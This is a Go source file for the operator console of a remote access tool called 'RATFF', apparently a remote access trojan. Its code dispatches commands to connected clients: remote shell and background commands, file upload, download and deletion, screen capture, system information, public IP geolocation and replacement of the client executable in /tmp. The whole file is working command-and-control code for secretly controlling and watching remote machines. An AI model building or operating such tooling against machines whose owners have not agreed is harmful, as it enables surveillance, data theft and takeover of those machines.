package main

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"

	"RATFF/server_cli/client"
	"RATFF/server_cli/output"
	"RATFF/shared"

	"github.com/google/shlex"
)

// ensureClientManager checks if clientManager is initialized and prints error if not.
// Returns true if initialized, false otherwise.
func ensureClientManager() bool {
	if clientManager == nil {
		PrintError(T("client_manager_not_initialized"))
		return false
	}
	return true
}

// buildPrompt generates the CLI prompt based on current mode.
func buildPrompt(id string, inCommandMode bool) string {
	return BuildPrompt(id, inCommandMode)
}

// handleServerMode processes commands in server mode (list, select, delete, etc.).
func handleServerMode(input string, selectedID string) string {
	args, err := shlex.Split(input)
	if err != nil {
		PrintError(Tf("invalid_command_args", err))
		return selectedID
	}

	if len(args) == 0 {
		return selectedID
	}

	cmd := args[0]

	switch cmd {
	case "help":
		printServerHelp()
	case "list":
		listClients()
	case "select":
		if len(args) < 2 {
			PrintError(T("usage_select"))
			return selectedID
		}
		if selectClient(args[1]) {
			return args[1]
		}
	case "delete":
		if len(args) < 2 {
			PrintError(T("usage_delete"))
			return selectedID
		}
		deleteClient(args[1])
	case "clear":
		clearScreen()
	case "exit":
		PrintSuccess(T("exited"))
		os.Exit(0)
	default:
		PrintError(T("invalid_command"))
	}

	return selectedID
}

// handleConsoleMode processes commands in console mode (command, cd, bg, back, exit).
func handleConsoleMode(input string, selectedID string) string {
	args, err := shlex.Split(input)
	if err != nil {
		PrintError(Tf("invalid_command_args", err))
		return ""
	}

	if len(args) == 0 {
		return ""
	}

	cmd := args[0]

	switch cmd {
	case "help":
		printConsoleHelp()
		return ""
	case "command":
		return "enter_command"
	case "clear":
		clearScreen()
		return ""
	case "cd":
		if len(args) < 2 {
			PrintError(T("usage_cd"))
			return ""
		}
		dir := strings.Join(args[1:], " ")
		cdClient(selectedID, dir)
		return ""
	case "pwd":
		pwdClient(selectedID)
		return ""
	case "upload":
		if len(args) < 2 {
			PrintError(T("usage_upload"))
			return ""
		}
		localPath := args[1]
		var remotePath string
		if len(args) >= 3 {
			remotePath = args[2]
		}
		uploadFile(selectedID, localPath, remotePath)
		return ""
	case "download":
		if len(args) < 2 {
			PrintError(T("usage_download"))
			return ""
		}
		remotePath := args[1]
		var localPath string
		if len(args) >= 3 {
			localPath = args[2]
		}
		downloadFile(selectedID, remotePath, localPath)
		return ""
	case "back":
		return "back"
	case "exit":
		return "exit"
	case "bg":
		return handleConsoleBgCommand(args, selectedID)
	case "systeminfo":
		var fields []string
		if len(args) > 1 {
			fields = args[1:]
		}
		systeminfo(selectedID, fields)
		return ""
	case "ls":
		var path string
		if len(args) >= 2 {
			path = strings.Join(args[1:], " ")
		}
		listFiles(selectedID, path)
		return ""
	case "mv":
		if len(args) < 3 {
			PrintError(T("usage_mv"))
			return ""
		}
		originPath := args[1]
		newPath := strings.Join(args[2:], " ")
		moveFile(selectedID, originPath, newPath)
		return ""
	case "cp":
		if len(args) < 3 {
			PrintError(T("usage_cp"))
			return ""
		}
		originPath := args[1]
		newPath := strings.Join(args[2:], " ")
		copyRemoteFile(selectedID, originPath, newPath)
		return ""
	case "rm":
		if len(args) < 2 {
			PrintError(T("usage_rm"))
			return ""
		}
		path := strings.Join(args[1:], " ")
		deleteFile(selectedID, path)
		return ""
	case "screencap":
		return handleScreenCaptureCommand(args, selectedID)
	case "publicip":
		publicip(selectedID)
		return ""
	case "update":
		if len(args) < 2 {
			PrintError(T("usage_update"))
			return ""
		}
		localPath := args[1]
		updateClient(selectedID, localPath)
		return ""
	default:
		PrintError(T("invalid_command"))
		return ""
	}
}

// printServerHelp displays available commands in server mode.
func printServerHelp() {
	PrintHelp([]HelpCommand{
		{Cmd: "list", Desc: T("cmd_list_desc")},
		{Cmd: "select <id>", Desc: T("cmd_select_desc")},
		{Cmd: "delete <id>", Desc: T("cmd_delete_desc")},
		{Cmd: "clear", Desc: T("cmd_clear_desc")},
		{Cmd: "help", Desc: T("cmd_help_desc")},
		{Cmd: "exit", Desc: T("cmd_exit_desc")},
	})
}

// printConsoleHelp displays available commands in console mode.
func printConsoleHelp() {
	PrintHelp([]HelpCommand{
		{Cmd: "command", Desc: T("cmd_command_desc")},
		{Cmd: "cd <dir>", Desc: T("cmd_cd_console_desc")},
		{Cmd: "pwd", Desc: T("cmd_pwd_desc")},
		{Cmd: "ls [path]", Desc: T("cmd_ls_desc")},
		{Cmd: "mv <origin> <destination>", Desc: T("cmd_mv_desc")},
		{Cmd: "cp <origin> <destination>", Desc: T("cmd_cp_desc")},
		{Cmd: "rm <path>", Desc: T("cmd_rm_desc")},
		{Cmd: "upload <local> [remote]", Desc: T("cmd_upload_desc")},
		{Cmd: "download <remote> [local]", Desc: T("cmd_download_desc")},
		{Cmd: "bg <cmd> [file]", Desc: T("cmd_bg_desc")},
		{Cmd: "systeminfo [fields...]", Desc: T("cmd_systeminfo_desc")},
		{Cmd: "screencap [options]", Desc: T("cmd_screencap_desc")},
		{Cmd: "publicip", Desc: T("cmd_publicip_desc")},
		{Cmd: "update <local_executable>", Desc: T("cmd_update_desc")},
		{Cmd: "back", Desc: T("cmd_back_desc")},
		{Cmd: "help", Desc: T("cmd_help_desc")},
		{Cmd: "exit", Desc: T("cmd_exit_desc")},
	})
}

// clearScreen clears the terminal screen using ANSI escape codes.
func clearScreen() {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("cmd", "/c", "cls")
		cmd.Stdout = os.Stdout
		_ = cmd.Run()
	} else {
		cmd := exec.Command("clear")
		cmd.Stdout = os.Stdout
		_ = cmd.Run()
	}
}

// handleCommandMode executes a shell command on the selected client.
func handleCommandMode(input string, id string) {
	sendShellCommand(id, input)
}

// handleConsoleBgCommand processes bg command in console mode.
func handleConsoleBgCommand(args []string, selectedID string) string {
	if len(args) < 2 {
		PrintError(T("usage_bg"))
		return ""
	}

	bgArgs := args[1:]
	var outputFile string
	var cmdParts []string

	for i, arg := range bgArgs {
		if strings.HasPrefix(arg, "/") || strings.Contains(arg, ":\\") {
			outputFile = arg
			cmdParts = bgArgs[:i]
			break
		}
	}

	if outputFile == "" {
		cmdParts = bgArgs
	}

	cmd := strings.Join(cmdParts, " ")
	if cmd == "" {
		PrintError(T("usage_bg"))
		return ""
	}

	id := selectedID
	if id == "" {
		clients, err := apiClient.FetchClients()
		if err != nil {
			PrintError(Tf("fetch_clients_failed", err))
			return ""
		}

		if len(clients) == 0 {
			PrintError(T("no_clients"))
			return ""
		}

		id = clients[0].ID
	}

	sendBgCommand(id, cmd, outputFile)
	return ""
}

// listClients retrieves and prints the list of connected clients.
func listClients() {
	if !ensureClientManager() {
		return
	}
	clientManager.ListClients(func(clients []shared.ClientInfo, t func(string) string, tf func(string, ...interface{}) string) {
		output.PrintClientTable(clients, t, tf)
	})
}

// selectClient checks if a client with the given ID exists.
func selectClient(id string) bool {
	if !ensureClientManager() {
		return false
	}
	return clientManager.SelectClient(id)
}

// deleteClient sends an exit command to the specified client.
func deleteClient(id string) {
	if !ensureClientManager() {
		return
	}
	clientManager.DeleteClient(id)
}

// cdClient changes the working directory on the remote client.
func cdClient(id string, dir string) {
	if !ensureClientManager() {
		return
	}
	clientManager.CdClient(id, dir)
}

// pwdClient gets the current working directory on the remote client.
func pwdClient(id string) {
	if !ensureClientManager() {
		return
	}
	clientManager.PwdClient(id)
}

// uploadFile uploads a file or directory to the remote client.
func uploadFile(id, localPath, remotePath string) {
	if !ensureClientManager() {
		return
	}
	clientManager.UploadFile(id, localPath, remotePath, func(total int64, filename string) client.ProgressBar {
		return output.NewProgressBar(total, filename)
	})
}

// downloadFile downloads a file or directory from the remote client.
func downloadFile(id, remotePath, localPath string) {
	if !ensureClientManager() {
		return
	}
	clientManager.DownloadFile(id, remotePath, localPath, func(total int64, filename string) client.ProgressBar {
		return output.NewProgressBar(total, filename)
	})
}

// listFiles lists files in a remote directory.
func listFiles(id, path string) {
	if !ensureClientManager() {
		return
	}
	clientManager.ListFiles(id, path, func(currentPath string, files []interface{}, t func(string) string, tf func(string, ...interface{}) string) {
		output.PrintFileTable(currentPath, files, t, tf)
	})
}

// moveFile moves a file on the remote client.
func moveFile(id, originPath, newPath string) {
	if !ensureClientManager() {
		return
	}
	clientManager.MoveFile(id, originPath, newPath)
}

// copyRemoteFile copies a file on the remote client.
func copyRemoteFile(id, originPath, newPath string) {
	if !ensureClientManager() {
		return
	}
	clientManager.CopyRemoteFile(id, originPath, newPath)
}

// deleteFile deletes a file on the remote client.
func deleteFile(id, path string) {
	if !ensureClientManager() {
		return
	}
	clientManager.DeleteFile(id, path)
}

// sendShellCommand sends a shell command to a client and waits for response.
func sendShellCommand(id string, cmd string) {
	if !ensureClientManager() {
		return
	}
	clientManager.ShellCommand(id, cmd, PrintCommandResult)
}

// sendBgCommand sends a background command to a client with optional output file.
func sendBgCommand(id string, cmd string, outputFile string) {
	if !ensureClientManager() {
		return
	}
	clientManager.BgCommand(id, cmd, outputFile)
}

// systeminfo retrieves system information from a client.
func systeminfo(id string, fields []string) {
	if !ensureClientManager() {
		return
	}
	clientManager.SystemInfo(id, fields, printSystemInfoDetail)
}

// handleScreenCaptureCommand processes screencap command in console mode.
func handleScreenCaptureCommand(args []string, selectedID string) string {
	if selectedID == "" {
		PrintError(T("no_client_selected"))
		return ""
	}

	format := "png"
	quality := 90
	displayIndex := 0
	outputPath := ""

	for i := 1; i < len(args); i++ {
		switch args[i] {
		case "-f", "--format":
			if i+1 < len(args) {
				format = args[i+1]
				i++
			}
		case "-q", "--quality":
			if i+1 < len(args) {
				var q int
				if _, err := fmt.Sscanf(args[i+1], "%d", &q); err == nil {
					quality = q
				}
				i++
			}
		case "-d", "--display":
			if i+1 < len(args) {
				var d int
				if _, err := fmt.Sscanf(args[i+1], "%d", &d); err == nil {
					displayIndex = d
				}
				i++
			}
		case "-o", "--output":
			if i+1 < len(args) {
				outputPath = args[i+1]
				i++
			}
		case "-h", "--help":
			printScreenCaptureHelp()
			return ""
		default:
			PrintError(Tf("invalid_command_args", args[i]))
			return ""
		}
	}

	captureScreen(selectedID, format, quality, displayIndex, outputPath)
	return ""
}

// printScreenCaptureHelp displays usage for screencap command.
func printScreenCaptureHelp() {
	PrintInfo(T("screencap_usage"))
}

// captureScreen captures screen from a client and optionally saves to file.
func captureScreen(id string, format string, quality int, displayIndex int, outputPath string) {
	if !ensureClientManager() {
		return
	}
	clientManager.ScreenCapture(id, format, quality, displayIndex, func(imageData string, width, height int, format string, displayIndex, displayCount int) {
		PrintSuccess(Tf("screen_capture_success", width, height, format, displayIndex, displayCount))

		if outputPath != "" {
			if err := client.SaveScreenCapture(imageData, format, outputPath); err != nil {
				PrintError(Tf("screen_capture_save_failed", err))
				return
			}
			PrintSuccess(Tf("screen_capture_saved_to", outputPath))
		} else {
			PrintInfo(T("screen_capture_no_output"))
		}
	})
}

// publicip retrieves public IP information from a client.
func publicip(id string) {
	if !ensureClientManager() {
		return
	}
	if id == "" {
		PrintError(T("no_client_selected"))
		return
	}
	clientManager.GetPublicIP(id, printPublicIPDetail)
}

// printPublicIPDetail prints public IP information with styling.
func printPublicIPDetail(payload map[string]interface{}) {
	PrintInfo(T("publicip_title"))

	for apiURL, rawData := range payload {
		PrintInfo(Tf("publicip_api_source", apiURL))

		dataMap, ok := rawData.(map[string]interface{})
		if !ok {
			PrintError(Tf("publicip_error", "invalid response format"))
			continue
		}

		if errMsg, hasError := dataMap["error"]; hasError {
			PrintError(Tf("publicip_error", errMsg))
			continue
		}

		apiSource := extractAPISource(apiURL)
		standard := shared.ExtractIPInfo(dataMap, apiSource)

		printStyledIPInfo(standard)
		printRawData(dataMap)
	}
}

// extractAPISource extracts API source name from URL.
func extractAPISource(url string) string {
	switch {
	case strings.Contains(url, "ip-api.com"):
		return "ip-api.com"
	case strings.Contains(url, "ipinfo.io"):
		return "ipinfo.io"
	case strings.Contains(url, "httpbin.org"):
		return "httpbin.org"
	default:
		return "unknown"
	}
}

// printStyledIPInfo prints standardized IP information with styling.
func printStyledIPInfo(info shared.IPGeoStandard) {
	if info.IP != "" {
		PrintInfo(Tf("publicip_ip", info.IP))
	}
	if info.Continent != "" {
		PrintInfo(Tf("publicip_continent", info.Continent))
	}
	if info.Country != "" {
		PrintInfo(Tf("publicip_country", info.Country, info.CountryCode))
	}
	if info.RegionName != "" {
		PrintInfo(Tf("publicip_region", info.RegionName))
	}
	if info.City != "" {
		PrintInfo(Tf("publicip_city", info.City))
	}
	if info.ISP != "" {
		PrintInfo(Tf("publicip_isp", info.ISP))
	}
	if info.Timezone != "" {
		PrintInfo(Tf("publicip_timezone", info.Timezone))
	}
	if info.Latitude != 0 && info.Longitude != 0 {
		PrintInfo(Tf("publicip_location", info.Latitude, info.Longitude))
	}
}

// printRawData prints raw API response data.
func printRawData(data map[string]interface{}) {
	PrintInfo(T("publicip_raw_data"))
	for key, value := range data {
		fmt.Printf("  %s: %v\n", key, value)
	}
	fmt.Println()
}

// updateClient uploads a new executable to the remote client and triggers a service update.
func updateClient(id, localFilePath string) {
	if id == "" {
		PrintError(T("no_client_selected"))
		return
	}

	if _, err := os.Stat(localFilePath); os.IsNotExist(err) {
		PrintError(Tf("update_file_not_exist", localFilePath))
		return
	}

	tempRemotePath := generateTempRemotePath(localFilePath)

	PrintInfo(Tf("update_uploading", localFilePath))
	uploadFile(id, localFilePath, tempRemotePath)

	PrintInfo(Tf("update_starting", id))
	sendUpdateCommand(id, tempRemotePath)
}

// sendUpdateCommand sends the service_update command to the remote client.
func sendUpdateCommand(id, tempPath string) {
	if !ensureClientManager() {
		return
	}
	clientManager.UpdateClient(id, tempPath)
}

// generateTempRemotePath generates a temporary remote path for the update file.
func generateTempRemotePath(localFilePath string) string {
	ext := ""
	if idx := strings.LastIndex(localFilePath, "."); idx != -1 {
		ext = localFilePath[idx:]
	}
	return "/tmp/ratff_update_" + shared.GenerateID() + ext
}
